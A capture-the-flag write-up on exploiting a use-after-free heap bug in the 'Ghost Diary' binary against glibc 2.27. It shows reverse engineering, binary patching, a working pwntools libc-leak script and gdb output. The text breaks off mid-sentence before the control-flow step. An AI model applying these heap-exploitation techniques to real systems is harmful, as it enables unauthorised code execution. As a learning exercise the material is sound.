# Ghost_Diary (pwn, pico, heap-exploitation, use-after-free, malloc_hook)

### Notes
- binary given
- libc 2.27 with checks enabled

### Enumeration
This is first hard task without source code provided. Let' start with quick enumeration:

```bash
$ file ghostdiary
ghostdiary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=da28ccb1f0dd0767b00267e07886470347987ce2, stripped
```

Binary is stripped meaning there are no symbols like `main` in it. This will make reverse engineering part way harder. As objdump was quite large let's first run a program under Ghidra to get a better understanding of what it does. Thanks to puts and printfs it is quite easy to recover what program does. 

Here is a simplified version of it.

```c

uint sizes[20];
char *pages[20];

void create_new_page() {
    uint idx = 0;
    while (idx < 20 && pages[idx]) ++idx;
    if (idx == 20) {
        return;
    }
    
    uint size;
    scanf("%d", size);
    if ((0xf1 < size && size < 0x10f) || (size > 0x1e1)) return;
    pages[idx] = malloc(size);
    sizes[idx] = size;
}

void write_on_page() {
    uint idx, size;
    scanf("%d", idx);
    page = pages[idx];
    if (!page) return;
    size = sizes[idx];
    read(stdin, page, size);
    page[size] = '\x00';
}

void read_page() {
    uint idx;
    scanf("%d", idx);
    page = pages[idx];
    if (!page) return;
    printf("%s", page);
}

void destroy_page() {
    uint idx;
    scanf("%d", idx);
    page = pages[idx];
    if (!page) return;
    free(page);
    pages[idx] = 0;
}

int main() {
    alarm(0x3c);
    signal(0xe, exit);

    while (1) {
        char cmd = getchar()
        switch (cmd) {
            case 0:
                create_new_page(); // New page in diary
                break;
            case 1:
                write_on_page(); // Talk to ghost
                break;
            case 2:
                read_page(); // Listen to ghost
                break;
            case 3:
                destroy_page(); // Burn the page
                break;
            case 4:
                exit(0); // Go to sleep
        }
    }
}
```

Before moving to vulnerabilities let's take care of `alarm + signal` function as it makes debuging a nightmare. The program exits after 0x3c seconds. Let's patch the binary under hexedit overwriting alarm instruction with nops.

```bash
$ objdump -d -M intel ghostdiary | grep -A1 -B2 alarm
     ff3:	e8 18 f9 ff ff       	call   910 <setvbuf@plt>
     ff8:	bf 3c 00 00 00       	mov    edi,0x3c
     ffd:	e8 be f8 ff ff       	call   8c0 <alarm@plt>
    1002:	48 8d 35 69 ff ff ff 	lea    rsi,[rip+0xffffffffffffff69]
$ objdump -d -M intel ghostdiary-patched | grep -A5 -B2 ffd
     ff3:	e8 18 f9 ff ff       	call   910 <setvbuf@plt>
     ff8:	bf 3c 00 00 00       	mov    edi,0x3c
     ffd:	90                   	nop
     ffe:	90                   	nop
     fff:	90                   	nop
    1000:	90                   	nop
    1001:	90                   	nop
    1002:	48 8d 35 69 ff ff ff 	lea    rsi,[rip+0xffffffffffffff69]
```

Now as we have dealed with obscurity let's check the program real protections:

```bash
$ checksec ghostdiary
[*] './ghostdiary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```


## Leaking libc_base address

Uh.. binary was compiled as Position Independant Executable, meaning we perhaps need a way to leak some address. The goal is to obtain a shell, so we need to find a way to control the instruction pointer.

Ok, now let's spot some vulnerabilities. We need something to play with!

First we can spot that the memory is not being cleaned before returning it to user. For example let's see how we can leak a libc address.

This is my python script which I wrote using pwntools for retriving libc_base address.

```python

# Constans found by manual enumeration
SMALL_BIN_OFFSET = 0x3ebf10 # I will show how to find it in a sec

def get_libc_base():
    # 7 chunk for tcache + 2 chunks for small bin list + 1 chunk to prevent from consolidation with top chunk
    for i in range(0, 10):
        allocate_page(psize(0x134))

    # Fill tchace with pages [0-6] + small bin with pages [7-8]. Page with idx.7 will contain libc small bin address in fd field.
    for i in range(0, 9):
        free_page(page(i))

    # As tcache is a LIFO, the chunk containing address of page 0 as fd field has now index 5.
    # Chunk containing libc address is now indexed as page 7
    for i in range(0, 9):
        allocate_page(psize(0x134))

    small_bin_addr = read_page(b'7')[:8]
    pad_len = 8 - len(small_bin_addr)
    small_bin_addr = u64(small_bin_addr + pad_len * b'\x00') # pad as printf string won't print null bytes
    log.info("Small_bin_addr: " + hex(small_bin_addr))

    libc_base = small_bin_addr - SMALL_BIN_OFFSET
    log.info("Libc base: " + hex(libc_base))
```

How can we get SMALL_BIN_OFFSET? Well when debuging I've used amazing pwntools feature to attach a process to gdb.

```python
gdb.attach(p)
raw_input(b'Continue and press ENTER to send payload')
get_libc_base()
exit_program() # to breakpoint on exit_group
```

This will open a new terminal. Normaly we would then set a breakpoint on `main` function and continue. But as we don't have any symbols avaible we need to find a way around. I've decided to use peda instruction `catch syscall 231` to breakpoint on exit_group syscall. This way we can examine the heap right after get_libc_base() function.

This let's us find SMALL_BIN_OFFSET. 
Our script will find small_bin_addr:

```bash
$ python3 exp.py
[+] Starting local process './ghostdiary': pid 3362
[*] running in new terminal: /usr/bin/gdb -q  "./ghostdiary" 3362 -x "/tmp/pwnivztx7hm.gdb"
[+] Waiting for debugger: Done
Continue and press ENTER to send payload
[*] Small_bin_addr: 0x7fcdd84dcf10
```

While our gdb will breakpoint on exit_group syscall. We can now examine the libc_base:

```
Catchpoint 1 (call to syscall exit_group), 0x00007fcdd81d5e06 in __GI__exit (
    status=0x0) at ../sysdeps/unix/sysv/linux/_exit.c:31
31	../sysdeps/unix/sysv/linux/_exit.c: No such file or directory.
gdb-peda$ i proc mappings
process 3417
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      [...]
      0x559eeca32000     0x559eeca53000    0x21000        0x0 [heap]
      0x7fcdd80f1000     0x7fcdd82d8000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fcdd82d8000     0x7fcdd84d8000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fcdd84d8000     0x7fcdd84dc000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fcdd84dc000     0x7fcdd84de000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7fcdd84de000     0x7fcdd84e2000     0x4000        0x0 
      0x7fcdd84e2000     0x7fcdd8509000    0x27000        0x0 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fcdd86eb000     0x7fcdd86ed000     0x2000        0x0 
      0x7fcdd8709000     0x7fcdd870a000     0x1000    0x27000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7fcdd870a000     0x7fcdd870b000     0x1000    0x28000 /lib/x86_64-linux-gnu/ld-2.27.so
      [...]
```

So libc was loaded under 0x7fcdd80f1000 and the small_bin_addr is 0x7fcdd84dcf10. This means that SMALL_BIN_OFFSET = 0x7fcdd84dcf10 - 0x7fcdd80f1000 = 0x3ebf10

## Taking control over instruction pointer
Ok, so now when we can find a libc_base address we just have to take control over instruction pointer to call `execve` from libc.

Let's think for a bit on how we would like to call it. We don't have an address of GOT table, so we need to overwrite something else. After a while I found a w

Note that the program was linked with glibc 2.27, meaning the `unlink macro` exploit won't work as we would fail on `corrupted double-linked list` (P->fd->bk == P and P->bk->fd == P, where P is a chunk being unlinked).
